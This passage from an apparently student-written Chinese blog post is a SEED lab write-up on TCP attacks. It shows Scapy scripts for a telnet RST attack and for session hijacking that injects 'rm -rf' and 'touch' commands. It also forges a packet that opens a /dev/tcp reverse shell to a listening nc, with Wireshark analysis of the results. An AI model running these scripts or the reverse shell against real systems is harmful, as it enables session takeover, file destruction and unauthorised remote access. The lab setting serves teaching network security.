</span></span><span class=line><span class=cl><span class=n>tcp</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>sport</span><span class=o>=</span><span class=mi>23</span><span class=p>,</span> <span class=n>dport</span><span class=o>=</span><span class=mi>58584</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s2>&#34;R&#34;</span><span class=p>,</span> <span class=n>seq</span><span class=o>=</span><span class=mi>1535522062</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pkt</span> <span class=o>=</span> <span class=n>ip</span><span class=o>/</span><span class=n>tcp</span>
</span></span><span class=line><span class=cl><span class=n>ls</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>pkt</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>在虚拟机端执行上述python脚本：<code>sudo python3 rstattack.py</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp21.png data-srcset="/images/tcp21.png, /images/tcp21.png 1.5x, /images/tcp21.png 2x" data-sizes=auto alt=image-20221210233702515 title=image-20221210233702515 width=1057 height=700></p></li><li><p>攻击结果，可以发现telnet连接已被断开。成功！</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp22.png data-srcset="/images/tcp22.png, /images/tcp22.png 1.5x, /images/tcp22.png 2x" data-sizes=auto alt=image-20221210233435819 title=image-20221210233435819 width=973 height=82></p></li></ol><h3 id=自动攻击>自动攻击</h3><p>自动脚本 => 利用scapy的sniff功能嗅探出序列号等信息，并进行攻击包的伪造发送。</p><p>成品开发中&mldr;&mldr;</p><h2 id=task-3-tcp-session-hijacking>Task 3: TCP Session Hijacking</h2><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp23.png data-srcset="/images/tcp23.png, /images/tcp23.png 1.5x, /images/tcp23.png 2x" data-sizes=auto alt=img title=img width=808 height=396></p><p>In this task, you need to demonstrate how you can hijack a telnet session between two computers. Your goal is to get the telnet server to run a malicious command from you.</p><h3 id=手动攻击-1>手动攻击</h3><blockquote><p>以victim容器作为服务端，user1作为客户端，虚拟机VM作为攻击主机</p></blockquote><ol><li><p>在虚拟机上打开Wireshark，监听any网卡，filter: <code>telnet</code></p></li><li><p>在服务端创建一个文件new.txt</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp24.png data-srcset="/images/tcp24.png, /images/tcp24.png 1.5x, /images/tcp24.png 2x" data-sizes=auto alt=image-20221212000050292 title=image-20221212000050292 width=1008 height=124></p></li><li><p>从用户机user1 telnet到victim，查看刚才创建的文件。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp25.png data-srcset="/images/tcp25.png, /images/tcp25.png 1.5x, /images/tcp25.png 2x" data-sizes=auto alt=image-20221212000143743 title=image-20221212000143743 width=1045 height=588></p></li></ol><p>劫持目标：删除服务器上的new.txt</p><ol start=4><li><p>抓包，在客户端和服务端进行通讯后，直接抓最后一个包。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp26.png data-srcset="/images/tcp26.png, /images/tcp26.png 1.5x, /images/tcp26.png 2x" data-sizes=auto alt=image-20221212000220555 title=image-20221212000220555 width=946 height=619></p></li><li><p>根据截获的当前二者通信的最后一个包中的源地址、目标地址、端口号、序列号以及Ack伪造下一个要发送的tcp包。</p><p>端口互换并采用 Next sequence number 作为下一个包的ack 、采用ack作为下一个包的seq。<strong>复习TCP三次握手等！</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>src</span><span class=o>=</span><span class=s2>&#34;10.9.0.6&#34;</span><span class=p>,</span> <span class=n>dst</span><span class=o>=</span><span class=s2>&#34;10.9.0.5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tcp</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>sport</span><span class=o>=</span><span class=mi>36498</span><span class=p>,</span> <span class=n>dport</span><span class=o>=</span><span class=mi>23</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=n>seq</span><span class=o>=</span><span class=mi>3699741602</span><span class=p>,</span> <span class=n>ack</span><span class=o>=</span><span class=mi>3039952057</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\r</span><span class=s2> rm -rf new.txt</span><span class=se>\r</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pkt</span> <span class=o>=</span> <span class=n>ip</span><span class=o>/</span><span class=n>tcp</span><span class=o>/</span><span class=n>data</span>
</span></span><span class=line><span class=cl><span class=n>ls</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>pkt</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>在虚拟机端发起攻击<code>sudo python3 sessionhijacking.py</code>，抓包可以看到该包发送，data中就是我们构造的数据，攻击成功！</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp27.png data-srcset="/images/tcp27.png, /images/tcp27.png 1.5x, /images/tcp27.png 2x" data-sizes=auto alt=image-20221212000516992 title=image-20221212000516992 width=1045 height=776></p><p><a id=picture1></a></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp28.png data-srcset="/images/tcp28.png, /images/tcp28.png 1.5x, /images/tcp28.png 2x" data-sizes=auto alt=image-20221212000558209 title=image-20221212000558209 width=947 height=417></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp29.png data-srcset="/images/tcp29.png, /images/tcp29.png 1.5x, /images/tcp29.png 2x" data-sizes=auto alt=image-20221212000622364 title=image-20221212000622364 width=947 height=417></p></li><li><p>进一步验证攻击效果：docker进入victim容器，查看seed用户~目录，发现空，攻击成功！</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp30.png data-srcset="/images/tcp30.png, /images/tcp30.png 1.5x, /images/tcp30.png 2x" data-sizes=auto alt=image-20221212000914173 title=image-20221212000914173 width=624 height=53></p></li></ol><blockquote><p>参考：</p><ol><li><a href=https://cloud.tencent.com/developer/article/1180299 target=_blank rel="external nofollow noopener noreferrer">TCP会话劫持原理与测试</a></li><li><a href=https://blog.csdn.net/xxx_qz/article/details/70945769 target=_blank rel="external nofollow noopener noreferrer">Attacks on TCP/IP Protocols (Task5) TCP Session Hijacking</a></li></ol></blockquote><h4 id=补充1>补充1</h4><p><strong>当会话劫持成功时，客户端会有什么特点，输入一些字符时什么现象？为什么？</strong></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp31.png data-srcset="/images/tcp31.png, /images/tcp31.png 1.5x, /images/tcp31.png 2x" data-sizes=auto alt=image-20221212000655892 title=image-20221212000655892 width=847 height=106></p><p>可以发现当劫持成功时，客户端在刚才的telnet连接下会有类似卡住的现象，想要输入一些字符发现是没有反应的(这也是为什么第七步进一步验证没在这个telnet连接里做，而是选择了docker新开一个终端进入victim验证)。即表现为与服务器交互没有反应，失去与服务器的会话连接。<a id=picture2></a></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp32.png data-srcset="/images/tcp32.png, /images/tcp32.png 1.5x, /images/tcp32.png 2x" data-sizes=auto alt=image-20221212000844135 title=image-20221212000844135 width=945 height=552></p><p>抓包可以发现在客户端尝试输入字符时会出现TCP spurious retransmission包(虚假重传)。关于TCP 虚假重传是指发送端重发了一个已经收到应答的报文段或者说是发送端认为发送的package已经丢失了，所以重传了，尽管此时接收端已经发送了对这些包的确认。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp33.png data-srcset="/images/tcp33.png, /images/tcp33.png 1.5x, /images/tcp33.png 2x" data-sizes=auto alt=img title=img width=1499 height=746></p><p>回到会话劫持这个问题上，我们是通过抓包已通信的最后一个包，获取其nextseq和ack进而构造出理论的下一个包的seq和在ack实现劫持，也就是说攻击主机已经将这个seq用掉了，并且服务端已经返回ack确认包。但是又在客户端尝试输入，输入内容所发的包用的还是刚才的seq(参见<a href=#picture1>此张截图</a>和<a href=#picture2>此张截图</a>，重点关注两个包的seq是相同的)，因为客户端并不知道被劫持seq被使用过了，所以又用相同的seq第二次发包，seq作为标识，相同意味着会被看做同一个包，即发送端重发了一个已经收到应答的报文段，造成虚假重传，并不会收到服务端的确认，即表现为没有交互反应，失去与服务器的会话连接。抓包中出现大量虚假重传记录的条数，本质上有点类似死循环，互相都在发一个对方已经丢弃(前面已确认)的包。</p><blockquote><p>参考资料：</p><ol><li><a href=https://www.chappell-university.com/post/spurious-retransmissions-a-concern target=_blank rel="external nofollow noopener noreferrer">Spurious Retransmissions - a Concern?</a></li><li><a href=http://ithitman.blogspot.com/2015/04/what-are-tcp-spurious-retransmissions.html target=_blank rel="external nofollow noopener noreferrer">What are TCP Spurious Retransmissions?</a></li><li><a href=https://blog.csdn.net/bytxl/article/details/49181467 target=_blank rel="external nofollow noopener noreferrer">spurious retransmission timeouts理解</a></li><li><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=228907" target=_blank rel="external nofollow noopener noreferrer">#干货满满#wireshark异常数据</a></li><li><a href=https://www.cnblogs.com/zhanghonglang/p/6973030.html target=_blank rel="external nofollow noopener noreferrer">wireshark一些术语解释</a></li></ol></blockquote><h4 id=补充2>补充2</h4><p><strong>当序列号设置的大一点会有什么现象？</strong></p><p>当前转最后一个通信包结果如下：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp34.png data-srcset="/images/tcp34.png, /images/tcp34.png 1.5x, /images/tcp34.png 2x" data-sizes=auto alt=image-20221212121850394 title=image-20221212121850394 width=947 height=537></p><p>伪造tcp包如下(将序列号设置的大一点)：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>src</span><span class=o>=</span><span class=s2>&#34;10.9.0.6&#34;</span><span class=p>,</span> <span class=n>dst</span><span class=o>=</span><span class=s2>&#34;10.9.0.5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tcp</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>sport</span><span class=o>=</span><span class=mi>47050</span><span class=p>,</span> <span class=n>dport</span><span class=o>=</span><span class=mi>23</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=n>seq</span><span class=o>=</span><span class=mi>1854277585</span><span class=p>,</span> <span class=n>ack</span><span class=o>=</span><span class=mi>124645373</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\r</span><span class=s2> touch new1.txt</span><span class=se>\r</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pkt</span> <span class=o>=</span> <span class=n>ip</span><span class=o>/</span><span class=n>tcp</span><span class=o>/</span><span class=n>data</span>
</span></span><span class=line><span class=cl><span class=n>ls</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>pkt</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>发起攻击<code>sudo python3 sessionhijacking.py</code></p><p>查看客户端，输入字符ls，可以发现此时可以输入，但是创建new1.txt文件并没有成功。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp35.png data-srcset="/images/tcp35.png, /images/tcp35.png 1.5x, /images/tcp35.png 2x" data-sizes=auto alt=image-20221212122646270 title=image-20221212122646270 width=983 height=539></p><p>抓包，可以明显看到刚才的会话劫持，若发送一个较大序列号的包会出现TCP Previous segment not captured的报错，也就是这个序列号之前的包并没收到，所以并没有响应malicious command。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp36.png data-srcset="/images/tcp36.png, /images/tcp36.png 1.5x, /images/tcp36.png 2x" data-sizes=auto alt=image-20221212122610526 title=image-20221212122610526 width=1323 height=629></p><p>后续194~214四个包则是执行ls命令所发出的telnet包，可以看到最后一个ack是1854277580，距离我们设置的序列号1854277585还有几个包，因此再尝试一次ls命令。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp37.png data-srcset="/images/tcp37.png, /images/tcp37.png 1.5x, /images/tcp37.png 2x" data-sizes=auto alt=image-20221212123424167 title=image-20221212123424167 width=1312 height=631></p><p>到这一步，我再尝试输入l时，客户端又没有响应了：</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp38.png data-srcset="/images/tcp38.png, /images/tcp38.png 1.5x, /images/tcp38.png 2x" data-sizes=auto alt=image-20221212124420431 title=image-20221212124420431 width=688 height=78></p><p>抓包可以看到，服务端会返回l的单个字符，并期望客户端下一个包序列号是1854277602。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp39.png data-srcset="/images/tcp39.png, /images/tcp39.png 1.5x, /images/tcp39.png 2x" data-sizes=auto alt=image-20221212124400014 title=image-20221212124400014 width=1297 height=577></p><p>随后就能看到他会执行先前因为previous segment没有收到而没执行的伪造包并返回(现在序列号满足要求了)，创建了new1.txt，同样新建shell进入victim查看效果，攻击成功。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp40.png data-srcset="/images/tcp40.png, /images/tcp40.png 1.5x, /images/tcp40.png 2x" data-sizes=auto alt=image-20221212124950730 title=image-20221212124950730 width=1299 height=672></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp41.png data-srcset="/images/tcp41.png, /images/tcp41.png 1.5x, /images/tcp41.png 2x" data-sizes=auto alt=image-20221212130021760 title=image-20221212130021760 width=918 height=148></p><p>没反应的l又是出现虚假重传问题，同理补充1。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp42.png data-srcset="/images/tcp42.png, /images/tcp42.png 1.5x, /images/tcp42.png 2x" data-sizes=auto alt=image-20221212124915542 title=image-20221212124915542 width=1299 height=672></p><div class="details admonition question open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-question-circle fa-fw" aria-hidden=true></i>疑惑<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>关于补充2，总体上目前理解是伪造包将序列号设置的大一些，直接发送后，服务端不会马上执行，同时此时telnet的客户端也不会没有响应(有序列号可以发包，还没发到相同的seq的包)，等到了伪造的序列号时，服务端会直接自动执行刚才未执行的伪造包，执行相应的malicious command，随后客户端又会陷入没响应状态，同理补充1。</p><p>但是对于细节，这个服务端返回的l和后面虚假重传的l是什么关联？理论上按的一次l应该也是能发包的能显示的，为什么没有响应和发包记录？不应该按第二次l才会造成虚假重传？289和291两个包的seq和ack如何理解？&mldr;再研究再研究，计网还得好好复习，欢迎指教和探讨！</p></div></div></div><h3 id=自动攻击-1>自动攻击</h3><p>自动脚本 => 利用scapy的sniff功能嗅探出序列号等信息，并进行攻击包的伪造发送。</p><p>成品开发中&mldr;&mldr;</p><h2 id=task-4-creating-reverse-shell-using-tcp-session-hijacking>Task 4: Creating Reverse Shell using TCP Session Hijacking</h2><p>In the TCP session hijacking attack, attackers cannot directly run a command on the victim machine, so their jobs is to run a reverse-shell command through the session hijacking attack.</p><h3 id=验证reverse-shell>验证Reverse Shell</h3><blockquote><p>涉及2台容器，attacker和victim</p></blockquote><ol><li><p>attacker中监听9090端口，<code>nc -lnv 9090</code></p><ul><li>-l 使用监听模式，管控传入的资料。</li><li>-n 直接使用IP地址，而不通过域名服务器。</li><li>-v 显示指令执行过程。</li></ul><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp43.png data-srcset="/images/tcp43.png, /images/tcp43.png 1.5x, /images/tcp43.png 2x" data-sizes=auto alt=image-20221212002451097 title=image-20221212002451097 width=1022 height=130></p></li><li><p>victim中执行逆向shell命令 <code>/bin/bash -i > /dev/tcp/10.9.0.1/9090 0&lt;&1 2>&1</code></p><ul><li>&ldquo;/bin/bash -i&rdquo;: i stands for interactive, meaning that the shell must be interactive (must provide a shell prompt)</li><li>&ldquo;> /dev/tcp/10.9.0.1/9090&rdquo;: This causes the output (stdout) of the shell to be redirected to the tcp connection to 10.9.0.1’s port 9090. The output stdout is represented by file descriptor number 1.</li><li>&ldquo;0&lt;&1&rdquo;: File descriptor 0 represents the standard input (stdin). This causes the stdin for the shell to be obtained from the tcp connection.</li><li>&ldquo;2>&1&rdquo;: File descriptor 2 represents standard error stderr. This causes the error output to be redirected to the tcp connection.</li></ul><blockquote><p>有助理解：</p><ol><li><a href=https://learnku.com/articles/54352 target=_blank rel="external nofollow noopener noreferrer">理解 shell 脚本中的常见用法: 2>&1</a></li><li><a href=https://xz.aliyun.com/t/2548 target=_blank rel="external nofollow noopener noreferrer">Linux反弹shell（一）文件描述符与重定向</a></li><li><a href=https://xz.aliyun.com/t/2549 target=_blank rel="external nofollow noopener noreferrer">Linux 反弹shell（二）反弹shell的本质</a></li></ol></blockquote><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp44.png data-srcset="/images/tcp44.png, /images/tcp44.png 1.5x, /images/tcp44.png 2x" data-sizes=auto alt=image-20221212004619531 title=image-20221212004619531 width=1011 height=152></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp45.png data-srcset="/images/tcp45.png, /images/tcp45.png 1.5x, /images/tcp45.png 2x" data-sizes=auto alt=image-20221212004638358 title=image-20221212004638358 width=1011 height=152></p></li></ol><h3 id=通过会话劫持获取reverse-shell>通过会话劫持获取Reverse Shell</h3><blockquote><p>以victim容器作为服务端，user1作为客户端，虚拟机VM作为攻击主机</p></blockquote><p>劫持目标：user1和victim进行telnet连接，攻击主机进行会话劫持并获得victim的reverse shell。</p><ol><li><p>user1 telnet 连接victim</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp46.png data-srcset="/images/tcp46.png, /images/tcp46.png 1.5x, /images/tcp46.png 2x" data-sizes=auto alt=image-20221212100006810 title=image-20221212100006810 width=1042 height=520></p></li><li><p>抓包，同理任务3。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp47.png data-srcset="/images/tcp47.png, /images/tcp47.png 1.5x, /images/tcp47.png 2x" data-sizes=auto alt=image-20221212100046220 title=image-20221212100046220 width=948 height=642></p></li><li><p>伪造tcp包，重点修改data也就是我们的malicious command</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>ip</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>src</span><span class=o>=</span><span class=s2>&#34;10.9.0.6&#34;</span><span class=p>,</span> <span class=n>dst</span><span class=o>=</span><span class=s2>&#34;10.9.0.5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tcp</span> <span class=o>=</span> <span class=n>TCP</span><span class=p>(</span><span class=n>sport</span><span class=o>=</span><span class=mi>46984</span><span class=p>,</span> <span class=n>dport</span><span class=o>=</span><span class=mi>23</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=s2>&#34;A&#34;</span><span class=p>,</span> <span class=n>seq</span><span class=o>=</span><span class=mi>683647009</span><span class=p>,</span> <span class=n>ack</span><span class=o>=</span><span class=mi>1421447214</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\r</span><span class=s2> /bin/bash -i &gt; /dev/tcp/10.0.2.15/9090 0&lt;&amp;1 2&gt;&amp;1 </span><span class=se>\r</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pkt</span> <span class=o>=</span> <span class=n>ip</span><span class=o>/</span><span class=n>tcp</span><span class=o>/</span><span class=n>data</span>
</span></span><span class=line><span class=cl><span class=n>ls</span><span class=p>(</span><span class=n>pkt</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>pkt</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>在攻击主机上首先监听9090端口并发起攻击，查看结果。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp53.png data-srcset="/images/tcp53.png, /images/tcp53.png 1.5x, /images/tcp53.png 2x" data-sizes=auto alt=image-20221212100729260 title=image-20221212100729260 width=949 height=83></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp49.png data-srcset="/images/tcp49.png, /images/tcp49.png 1.5x, /images/tcp49.png 2x" data-sizes=auto alt=image-20221212100854141 title=image-20221212100854141 width=1494 height=762></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp48.png data-srcset="/images/tcp48.png, /images/tcp48.png 1.5x, /images/tcp48.png 2x" data-sizes=auto alt=image-20221212100918674 title=image-20221212100918674 width=869 height=146></p></li><li><p>验证，通过ifconfig命令查看逆向shell ip。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/tcp50.png data-srcset="/images/tcp50.png, /images/tcp50.png 1.5x, /images/tcp50.png 2x" data-sizes=auto alt=image-20221212101004096 title=image-20221212101004096 width=1323 height=618></p><p>可以发现当前得到的shell ip是10.9.0.5，正是服务端(victim)的ip，即在攻击主机上获得服务端reverse shell成功！</p></li></ol><blockquote><p>参考资料：<a href=http://note.blueegg.net.cn/seed-labs/ target=_blank rel="external nofollow noopener noreferrer">网络安全攻防实验</a></p></blockquote></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="2022-12-12 13:35:15">更新于 2022-12-12&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/ class=post-tag>网络安全攻防实验</a><a href=/tags/wireshark/ class=post-tag>Wireshark</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/warmup-writeup/ class=post-nav-item rel=prev title="warmup Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>warmup Writeup</a>
<a href=/posts/secret-key-encryption/ class=post-nav-item rel=next title=对称加密实验>对称加密实验<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></main><footer class=footer><div class=footer-container><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>
<a href=https://github.com/LaneGong target=_blank rel="external nofollow noopener noreferrer">Lane Gong</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class=site-time title="网站运行中 ..."><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden=true></i>&nbsp;<span class=run-times>网站运行中 ...</span></span></div><div class="footer-line ibruce"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw" aria-hidden=true></i>&nbsp;<span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div><div class="footer-line beian"><span class="icp footer-divider"><a href=https://beian.miit.gov.cn/ target=_blank>沪ICP备2022033527号-1</a></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div></div><div id=mask></div><div class=reading-progress-bar style=left:0;top:0></div><noscript><div class=noscript-warning>FixIt 主题在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/algoliasearch/algoliasearch-lite.umd.min.js defer></script><script src=/lib/lazysizes/lazysizes.min.js async defer></script><script src=/lib/katex/katex.min.js defer></script><script src=/lib/katex/auto-render.min.js defer></script><script src=/lib/katex/copy-tex.min.js defer></script><script src=/lib/katex/mhchem.min.js defer></script><script src=/lib/cookieconsent/cookieconsent.min.js defer></script><script src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js async defer></script><script>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:10},comment:{enable:!1},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验。"},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"",algoliaIndex:"",algoliaSearchKey:"",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30,type:"algolia"},siteTime:"2022-11-23T15:00:00+08:00"}</script><script src=/js/theme.min.js defer></script></body></html>